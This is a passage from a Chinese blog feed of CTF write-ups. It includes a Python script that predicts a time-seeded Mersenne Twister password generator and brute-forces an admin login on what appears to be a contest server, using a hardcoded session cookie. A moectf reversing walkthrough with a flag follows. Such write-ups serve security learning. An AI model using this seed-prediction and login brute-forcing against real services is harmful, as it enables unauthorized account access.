class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> **__fastcall <span class="title">gen_rand</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">void</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">void</span> **v3; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">void</span> **v4; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v5; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line">  DWORD v7; <span class="comment">// eax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  DWORD v9; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// er12</span></span><br><span class="line">  __int64 idx; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// edx</span></span><br><span class="line">  __int64 table_1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">bool</span> v15; <span class="comment">// cc</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *v16; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">wchar_t</span> v17; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">float</span> rand; <span class="comment">// xmm0_4</span></span><br><span class="line">  <span class="keyword">float</span> v19; <span class="comment">// xmm6_4</span></span><br><span class="line">  <span class="keyword">float</span> v20; <span class="comment">// xmm0_4</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> pos; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">bool</span> v23; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">void</span> *v24; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">signed</span> __int32 v25; <span class="comment">// et0</span></span><br><span class="line">  <span class="keyword">wchar_t</span> **v26; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">signed</span> __int32 v27; <span class="comment">// et0</span></span><br><span class="line">  <span class="keyword">wchar_t</span> **table; <span class="comment">// [rsp+28h] [rbp-13F0h] BYREF</span></span><br><span class="line">  DWORD ptable[<span class="number">624</span>]; <span class="comment">// [rsp+30h] [rbp-13E8h] BYREF</span></span><br><span class="line">  DWORD v31[<span class="number">624</span>]; <span class="comment">// [rsp+30h] [rbp-13E8h] FORCED BYREF</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+9F0h] [rbp-A28h]</span></span><br><span class="line">  <span class="keyword">float</span> v33; <span class="comment">// [rsp+A00h] [rbp-A18h] OVERLAPPED</span></span><br><span class="line">  <span class="keyword">float</span> v34; <span class="comment">// [rsp+A04h] [rbp-A14h] 0</span></span><br><span class="line">  DWORD randobj[<span class="number">640</span>]; <span class="comment">// [rsp+A08h] [rbp-A10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">void</span> *, <span class="keyword">void</span> *))sub_446270)(a1, a2);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  v5 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="keyword">int</span> *)(v2 + <span class="number">32</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *v3 = (<span class="keyword">void</span> *)sub_B21B40(byte_F58069, <span class="number">0x1B</span>u);</span><br><span class="line">    <span class="keyword">return</span> v4;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = *(_BYTE *)(v2 + <span class="number">36</span>) == <span class="number">0</span>;</span><br><span class="line">  table = (<span class="keyword">wchar_t</span> **)dword_11E9580;            <span class="comment">// 字母表</span></span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    str_append((<span class="keyword">void</span> **)&amp;table, (__int64 *)v2);</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(v5 + <span class="number">37</span>) )</span><br><span class="line">    str_append((<span class="keyword">void</span> **)&amp;table, (__int64 *)(v5 + <span class="number">8</span>));</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(v5 + <span class="number">38</span>) )</span><br><span class="line">    str_append((<span class="keyword">void</span> **)&amp;table, (__int64 *)(v5 + <span class="number">16</span>));</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(v5 + <span class="number">39</span>) )</span><br><span class="line">    str_append((<span class="keyword">void</span> **)&amp;table, (__int64 *)(v5 + <span class="number">24</span>));</span><br><span class="line">  v7 = time64(<span class="number">0</span>i64);</span><br><span class="line">  v8 = <span class="number">1</span>i64;</span><br><span class="line">  v9 = v7;</span><br><span class="line">  ptable[<span class="number">0</span>] = v7;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptable[v8] = v8 + <span class="number">1812433253</span> * (v9 ^ (v9 &gt;&gt; <span class="number">30</span>));<span class="comment">// 624次?</span></span><br><span class="line">    <span class="keyword">if</span> ( ++v8 == <span class="number">624</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = ptable[v8 - <span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  v32 = <span class="number">624</span>i64;</span><br><span class="line">  *(_QWORD *)&amp;v33 = <span class="number">0x3F80000000000000</span>i64;      <span class="comment">// float(1.0), 0</span></span><br><span class="line">  <span class="built_in">memcpy</span>(randobj, ptable, <span class="number">0x9C8</span>ui64);           <span class="comment">// copy all randoms</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = *(_DWORD *)(v5 + <span class="number">32</span>);</span><br><span class="line">    *(_QWORD *)v31 = dword_11E9580;</span><br><span class="line">    <span class="keyword">if</span> ( v10 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v17 = <span class="number">0</span>;</span><br><span class="line">        rand = get_rand(randobj);</span><br><span class="line">        v19 = (<span class="keyword">float</span>)(rand * (<span class="keyword">float</span>)(v34 - v33)) + v33;<span class="comment">// v19=1-rand</span></span><br><span class="line">        v20 = get_rand(randobj);</span><br><span class="line">        len = *((_DWORD *)table + <span class="number">1</span>);</span><br><span class="line">        pos = (<span class="keyword">int</span>)(<span class="keyword">float</span>)((<span class="keyword">float</span>)((<span class="keyword">float</span>)((<span class="keyword">float</span>)(v20 * (<span class="keyword">float</span>)(v34 - v33)) + v33) * v19) * (<span class="keyword">float</span>)len);</span><br><span class="line">        <span class="keyword">if</span> ( pos &lt; len )</span><br><span class="line">          v17 = *(_WORD *)((<span class="keyword">char</span> *)table + <span class="number">2</span> * pos + (_QWORD)table[<span class="number">2</span>]);</span><br><span class="line">        table_1 = *(_QWORD *)v31;</span><br><span class="line">        <span class="keyword">if</span> ( **(_DWORD **)v31 &gt; <span class="number">1u</span> )</span><br><span class="line">          <span class="keyword">break</span>;                                <span class="comment">// fail</span></span><br><span class="line">        idx = *(<span class="keyword">int</span> *)(*(_QWORD *)v31 + <span class="number">4</span>i64);</span><br><span class="line">        v13 = idx + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">int</span>)idx + <span class="number">2</span> &gt; (*(_DWORD *)(*(_QWORD *)v31 + <span class="number">8</span>i64) &amp; <span class="number">0x7FFFFFFF</span>u) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">gen:                                            <span class="comment">// char generation loop</span></span><br><span class="line">        ++v11;</span><br><span class="line">        *(_DWORD *)(table_1 + <span class="number">4</span>) = idx + <span class="number">1</span>;</span><br><span class="line">        v15 = *(_DWORD *)(v5 + <span class="number">32</span>) &lt;= v11;</span><br><span class="line">        v16 = (<span class="keyword">wchar_t</span> *)(*(_QWORD *)(table_1 + <span class="number">16</span>) + table_1 + <span class="number">2</span> * idx);</span><br><span class="line">        *v16 = v17;                             <span class="comment">// the charactor</span></span><br><span class="line">        v16[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v15 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      &#125;</span><br><span class="line">      v13 = *(_DWORD *)(*(_QWORD *)v31 + <span class="number">4</span>i64) + <span class="number">2</span>;</span><br><span class="line">LABEL_17:</span><br><span class="line">      sub_B20AD0((<span class="keyword">void</span> **)v31, v13, <span class="number">1</span>);</span><br><span class="line">      table_1 = *(_QWORD *)v31;</span><br><span class="line">      idx = *(<span class="keyword">int</span> *)(*(_QWORD *)v31 + <span class="number">4</span>i64);</span><br><span class="line">      <span class="keyword">goto</span> gen;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_23:</span><br><span class="line">    v23 = sub_BC91C0(v5, (__int64 *)v31);</span><br><span class="line">    v24 = *(<span class="keyword">void</span> **)v31;</span><br><span class="line">    <span class="keyword">if</span> ( v23 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( **(_DWORD **)v31 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( **(_DWORD **)v31 == <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      v25 = _InterlockedSub(*(<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 **)v31, <span class="number">1u</span>);</span><br><span class="line">      v24 = *(<span class="keyword">void</span> **)v31;</span><br><span class="line">      <span class="keyword">if</span> ( v25 )</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_64A030(v24);</span><br><span class="line">  &#125;                                             <span class="comment">// gen end</span></span><br><span class="line">  *v4 = *(<span class="keyword">void</span> **)v31;</span><br><span class="line">  *(_QWORD *)v31 = dword_11E9580;</span><br><span class="line">  v26 = table;</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)table</span><br><span class="line">    || *(_DWORD *)table != <span class="number">-1</span> &amp;&amp; (v27 = _InterlockedSub((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)table, <span class="number">1u</span>), v26 = table, !v27) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_64A030(v26);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>个人感觉C++的程序比C的难读很多, 一开始没什么头绪, 然后就放了几天.<br>周四把这个函数理了一下, 抱着尝试的态度去网上找了下算法中出现的1812433253这个数字.<br>然后恍然大悟, 这是梅森旋转算法, (C库里那个rand是线性同余算法, 和这个一样都属于不安全的随机数生成算法)<br>程序中的大小为624的数组印证了我的猜想.<br>然后就硬看, 生成过程大概是:</p><ul><li>检查4个复选框, 把4个字母表拼成一个长字符串, 在这题中4种字符都要有.</li><li>初始化梅森旋转算法</li><li>生成密码(单个字符<code>c = rand() * rand() * len(alphatable)</code>, 所以取到字母表的前面的字母概率较大)</li><li>如果密码没有同时包含4种字符, 全部推倒重来</li></ul><p>最后一条规则看代码没看出来. 运行程序把4种类型都选上, 长度改成3(构造不可能事件). 结果程序一直在get_rand, 大胆猜测推倒重来这个规则, 结果验证后发现这是对的. <del>我把它叫做假说-演绎法(</del><br>写解密算法就OK:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">lst = []</span><br><span class="line">idx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">srand</span>(<span class="params">t</span>):</span></span><br><span class="line">    <span class="keyword">global</span> idx</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    lst.clear()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">        lst.append(t)</span><br><span class="line">        t = (<span class="number">1812433253</span> * (t ^ (t &gt;&gt; <span class="number">30</span>)) + i + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">step</span>():</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">            y = (lst[i] &amp; <span class="number">0x80000000</span>) + (lst[(i + <span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7FFFFFFF</span>)</span><br><span class="line">            lst[i] = lst[(i + <span class="number">397</span>) % <span class="number">624</span>] ^ (y &gt;&gt; <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> (y &amp; <span class="number">1</span>) != <span class="number">0</span>: lst[i] = lst[i] ^ <span class="number">2567483615</span></span><br><span class="line">    <span class="keyword">global</span> idx</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>: step()</span><br><span class="line">    y = lst[idx]</span><br><span class="line">    y = y ^ (y &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    y = y ^ ((y &lt;&lt; <span class="number">7</span>) &amp; <span class="number">2636928640</span>)</span><br><span class="line">    y = y ^ ((y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">4022730752</span>)</span><br><span class="line">    y = y ^ (y &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    idx = (idx + <span class="number">1</span>) % <span class="number">624</span></span><br><span class="line">    <span class="keyword">return</span> y / <span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">time</span>):</span></span><br><span class="line">    <span class="keyword">if</span> time != -<span class="number">1</span>: srand(time)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">truerand</span>():</span></span><br><span class="line">        x = rand()</span><br><span class="line">        y = rand()</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(x * y * <span class="number">94</span>)</span><br><span class="line">    alpha = <span class="string">&#x27;&#x27;&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_+`-=[]\\&#123;&#125;|;&#x27;:\&quot;,./&lt;&gt;?&#x27;&#x27;&#x27;</span></span><br><span class="line">    stat = [<span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">94</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        stat[i] = <span class="number">0</span></span><br><span class="line">        stat[i + <span class="number">26</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        stat[i + <span class="number">52</span>] = <span class="number">2</span></span><br><span class="line">    r, vt = <span class="string">&#x27;&#x27;</span>, [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        x = truerand()</span><br><span class="line">        y = stat[x]</span><br><span class="line">        vt[y] = vt[y] + <span class="number">1</span></span><br><span class="line">        r = r + alpha[x]</span><br><span class="line">    <span class="keyword">if</span> vt[<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">or</span> vt[<span class="number">1</span>] == <span class="number">0</span> <span class="keyword">or</span> vt[<span class="number">2</span>] == <span class="number">0</span> <span class="keyword">or</span> vt[<span class="number">3</span>] == <span class="number">0</span>: r = gen(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">csrf = <span class="string">&#x27;4uU4gCiPKItbRLPCOwNZcRhYzknHuWJHklxxQv5LohsRmjwpcyHGzGrhnQeDCSdd&#x27;</span></span><br><span class="line">sid = <span class="string">&#x27;eyJ0b2tlbiI6IjY4OTpNRVFDSUdhNkFIQmFqS1ZqZ0cyUTJpeWhtSkpUVi9hT0dPYzArV28zL1VReVpWbjFBaUFRd0k1b0R0dWdiSGQ4U1ZTTEFDeTgrTXEvZmZvS1AwMlZXQ0lDbkp1M3dBPT0ifQ:1mg5t5:2-_5RzMfjBfLBtAP1B21xcxzNuY3mka0XBvViLoB_hM&#x27;</span></span><br><span class="line">head = <span class="string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=&quot;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">k</span>):</span></span><br><span class="line">    cookie = &#123;<span class="string">&#x27;csrftoken&#x27;</span>: csrf, <span class="string">&#x27;sessionid&#x27;</span>: sid&#125;</span><br><span class="line">    r = requests.get(<span class="string">&#x27;http://202.38.93.111:15002/login&#x27;</span>, cookies=cookie)</span><br><span class="line">    p = r.text.find(head) + <span class="built_in">len</span>(head)</span><br><span class="line">    q = r.text.find(<span class="string">&#x27;&quot;&#x27;</span>, p)</span><br><span class="line">    csrf_mid = r.text[p:q]</span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://202.38.93.111:15002/login&#x27;</span>, cookies=cookie, data=&#123;<span class="string">&#x27;csrfmiddlewaretoken&#x27;</span>: csrf_mid, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: k&#125;)</span><br><span class="line">    <span class="keyword">return</span> r.text.find(<span class="string">&#x27;用户名或密码错误&#x27;</span>) == -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">t = <span class="built_in">int</span>(time.mktime(time.strptime(<span class="string">&#x27;2021-09-22 23:12&#x27;</span>, <span class="string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)))</span><br><span class="line">dt = <span class="number">0</span></span><br><span class="line">d = <span class="number">8</span> * <span class="number">3600</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(dt)</span><br><span class="line">    k = gen(t - dt + d)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(t - dt + d) + <span class="string">&#x27;  -&gt;  &#x27;</span> + k + <span class="string">&#x27;  ...  &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> test(k):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;failed&#x27;</span>)</span><br><span class="line">    k = gen(t - dt)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(t - dt) + <span class="string">&#x27;  -&gt;  &#x27;</span> + k + <span class="string">&#x27;  ...  &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> test(k):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;failed&#x27;</span>)</span><br><span class="line">    k = gen(t - dt - d)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(t - dt - d) + <span class="string">&#x27;  -&gt;  &#x27;</span> + k + <span class="string">&#x27;  ...  &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> test(k):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;failed&#x27;</span>)</span><br><span class="line">    dt = dt + <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>可能还是技术不足, 之前不知道session这个东西, 就拿csrf去充当参数. 不过, 问题不大<br>脚本在dt为六十几的时候命中密码, 当时超级兴奋!!!</p><p>但是看了官方WP的做法后人傻了, 原来就我在逆向生成算法555</p><h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>星期八再说(</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>moectf 题解记录</title>
      <link href="/2021/09/26/moectf/"/>
      <url>/2021/09/26/moectf/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><blockquote><p>有一个人前来参加CTF</p></blockquote><p>听说是入门级别, 试下水, 结果发现挺有意思.<br><a href="https://www.moectf.online/">网站链接</a></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><p>歪比巴卜</p><h3 id="welcome-to-the-world-of-re"><a href="#welcome-to-the-world-of-re" class="headerlink" title="welcome_to_the_world_of_re"></a>welcome_to_the_world_of_re</h3><p>IDA载入, 容易看出这几行是检验过程:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">void</span> *))funcs_4016DE[i])(&amp;unk_407040);</span><br></pre></td></tr></table></figure><p><code>unk_407040</code>是你输入的数据, <code>for</code>里有4个函数, 逐个打开查看</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td><code>sub_401550</code></td><td>检查长度</td></tr><tr><td><code>sub_401585</code></td><td>检查是否是”moectf{“开头</td></tr><tr><td><code>sub_4015C5</code></td><td>检查结尾是否为”}</td></tr><tr><td><code>sub_401606</code></td><td>检查flag内容, 发现flag直接放在<code>off_403028</code>里</td></tr></tbody></table></div><p>如果事先发现没有加密的话, 也可以直接记事本打开搜”moectf{“.</p><blockquote><p>moectf{W31C0Me_t0_m03CTF_2021_w0o0o0oooo0ooooo0o0oooo0!!!}</p></blockquote><h3 id="EinfachRe"><a href="#EinfachRe" class="headerlink" title="EinfachRe"></a>EinfachRe</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Destination[<span class="number">7</span>]; <span class="comment">// [esp+16h] [ebp-1Ah] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v[<span class="number">14</span>]; <span class="comment">// [esp+1Dh] [ebp-13h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+2Bh] [ebp-5h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  <span class="built_in">strcpy</span>(Destination, enflag);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Give me your flag:&quot;</span>);</span><br><span class="line">  gets(v);</span><br><span class="line">  <span class="keyword">if</span> ( check(v) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v[i] ^ v[i + <span class="number">7</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v3 != Destination[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;try again!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;your flag is moectf&#123;******&#125;&quot;</span>);</span><br><span class="line">        system(<span 